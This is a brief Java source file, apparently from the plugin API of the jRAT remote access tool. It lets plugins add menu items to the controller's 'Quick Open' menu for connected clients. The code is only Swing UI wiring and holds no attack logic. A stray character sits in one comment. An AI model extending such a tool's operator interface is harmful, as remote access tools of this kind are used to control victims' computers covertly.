package jrat.api.ui;

import jrat.controller.ui.frames.Frame;

import javax.swing.*;

public class ClientMenu {

    /**
     * Client menu categories
     */
    public enum Category {
        QUICK_OPEN
    }

    /**
     * Adds an item to the specified category
n     * @param menuItem
     */
    public static void addItem(ClientMenuItem menuItem) {
        JMenuItem item = menuItem.getJMenuItem();

        JMenu menu = null;

        switch (menuItem.category) {
            case QUICK_OPEN:
                menu = Frame.panelClients.mnQuickOpen;
                break;
        }

        menu.add(item);
    }
}
